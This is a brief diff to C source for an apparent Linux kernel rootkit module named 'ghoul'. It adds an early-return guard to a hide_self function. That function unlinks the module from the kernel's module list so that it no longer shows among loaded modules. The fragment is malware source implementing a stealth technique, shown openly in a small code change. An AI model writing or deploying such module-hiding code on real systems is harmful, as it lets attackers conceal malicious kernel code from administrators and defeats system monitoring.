@@ -9,6 +9,9 @@ int is_hidden = 0;
 
 void hide_self(void)
 {
+    if (is_hidden)
+        return;
+    
     pr_info("ghoul: hiding self\n");
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
